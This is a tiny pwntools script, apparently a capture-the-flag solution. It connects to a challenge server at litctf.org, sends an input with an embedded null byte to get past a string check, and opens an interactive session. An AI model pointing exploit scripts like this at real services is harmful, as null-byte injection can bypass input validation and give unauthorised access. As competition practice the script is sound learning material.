from pwn import *

# r = process("./main")
r = remote("litctf.org", 31770)

payload = b"abc\0lit"

print(r.recvline().decode())
r.sendline(payload)
r.interactive()